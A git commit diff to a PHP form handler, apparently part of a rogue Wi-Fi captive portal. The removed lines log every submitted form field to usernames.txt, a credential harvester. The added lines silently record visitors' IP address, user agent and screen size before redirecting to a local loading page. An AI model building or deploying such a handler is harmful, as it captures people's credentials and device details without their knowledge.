840a8dbe3b5d3f6f0e9381c64764d8c93f629f0f
Adam Sosnowski <35542979+sosnek@users.noreply.github.com>
2024-03-07 23:37:37 -0500

    device info

--- html/post.php
+++ html/post.php
@@ -1,13 +1,22 @@
 <?php
-header ('Location:http://10.1.1.1/loading.html');
-$handle = fopen("usernames.txt", "a");
-foreach($_POST as $variable => $value) {
-   fwrite($handle, $variable);
-   fwrite($handle, "=");
-   fwrite($handle, $value);
-   fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
+header('Location: http://10.1.1.1/loading.html'); // Redirect to a loading page
+
+// Open or create 'visitors.txt' file for appending
+$file = fopen("visitors.txt", "a") or die("Unable to open file!");
+
+// Extract client device information
+$clientInfo = json_encode([
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'userAgent' => $_SERVER['HTTP_USER_AGENT'],
+    'screenWidth' => $_POST['screenWidth'],
+    'screenHeight' => $_POST['screenHeight']
+]);
+
+// Write client device information to the file
+fwrite($file, $clientInfo . "\n");
+
+// Close the file
+fclose($file);
+
 exit;
 ?>
